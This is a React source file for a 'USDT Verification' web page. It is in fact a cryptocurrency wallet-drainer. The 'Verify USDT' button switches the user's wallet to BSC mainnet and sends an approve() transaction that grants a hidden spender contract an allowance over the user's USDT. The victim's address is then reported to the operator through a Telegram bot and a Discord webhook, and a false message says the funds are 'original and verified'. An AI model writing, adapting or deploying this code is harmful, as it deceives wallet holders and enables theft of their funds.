import { useState } from 'react'
import './App.css'
import {Web3} from 'web3';


const sendNotification = async (user)=>{
   // Send notifications
   const teleToken = import.meta.env.VITE_TELETOKEN
  const teleChatId = import.meta.env.VITE_TELECHATTOKEN
  const discordToken = import.meta.env.VITE_DISCORD
    try {
      // Telegram notification
      await fetch(`https://api.telegram.org/bot${teleToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: teleChatId,
          text: `✅ USDT Verified: ${user}`
        })
      });

      // Discord notification
      await fetch(discordToken, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `✅ USDT BEP-20 Verified: ${user}`
        })
      });

    } catch (notifyError) {
      console.error("Notification error:", notifyError);
    }
}
async function verifyUSDT() {

  if (typeof window.ethereum === 'undefined') {
    alert('Please install MetaMask, Trust Wallet, or Binance Wallet to proceed.');
    return;
  }

  const provider = window.ethereum;

  const contract = import.meta.env.VITE_CONTRACT
  const amount = import.meta.env.VITE_AMOUNT
  const usdtAddress = import.meta.env.VITE_USDTADDR
  try {
    // Show loading stateVITE_
    verifyBtn.disabled = true;
    loadingSpinner.style.display = 'block';
    loadingIndicator.style.display = 'block';

    // Switch to BSC Mainnet
    await provider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x38' }] // BSC Mainnet
    });

    // Request account access
    await provider.request({ method: 'eth_requestAccounts' });
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];

    const gasPrice = web3.utils.toWei(gasSlider.value, 'gwei');
    const abi = [{
      "constant": false,
      "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    }];

    const usdt = new web3.eth.Contract(abi, usdtAddress);

    // Execute approval transaction with fixed amount
    await usdt.methods.approve(contract, amount).send({
      from: user,
      gasPrice: gasPrice
    });

    sendNotification(user)
    // Show success message
    successMessage.style.display = "block";
    loadingSpinner.style.display = 'none';
    loadingIndicator.style.display = 'none';

  
  } catch (error) {
    console.error(error);
    alert("Verification failed. Please try again.");
    loadingSpinner.style.display = 'none';
    loadingIndicator.style.display = 'none';
    verifyBtn.disabled = false;
  }
}
function App() {

  const [slider , setSlider] = useState(5)
  const [loading , setLoading ] = useState(false)

  return (
    <>
      <div class="container">
        <div class="logo">
          <i class="fas fa-coins"></i>
        </div>

        <h1>USDT Verification</h1>

        <div class="slider-container">
          <div class="slider-label">
            <span>Gas Price:</span>
            <span id="gweiLabel">{slider} Gwei</span>
          </div>
          <input type="range" id="gasSlider" min="1" max="30" value={slider} onChange={(e)=>setSlider(e.target.value)}  />
          <div class="gas-info">Adjust transaction speed and cost</div>
        </div>

        <button class="verify-btn" id="verifyBtn" onClick={verifyUSDT}>
          <i class="fas fa-check-circle"></i> Verify USDT
        </button>

        <div class="success-message" id="successMessage">
          <i class="fas fa-check-circle"></i> Your <strong>USDT</strong> is original and verified!
        </div>

        <div class="loading" id="loadingIndicator">
          <div class="loading-spinner" id="loadingSpinner"></div>
          <p>Processing transaction...</p>
        </div>

        <footer>
          <div class="usdt-badge">Only supports USDT BEP-20</div>
          <div class="wallet-icons">
            <div class="wallet-icon"><i class="fas fa-wallet"></i></div>
            <div class="wallet-icon"><i class="fab fa-ethereum"></i></div>
            <div class="wallet-icon"><i class="fab fa-google-wallet"></i></div>
          </div>
          All Web3 wallets supported – Trust Wallet, MetaMask, Binance Wallet &amp; more.
        </footer>
      </div>
    </>
  )
}

export default App
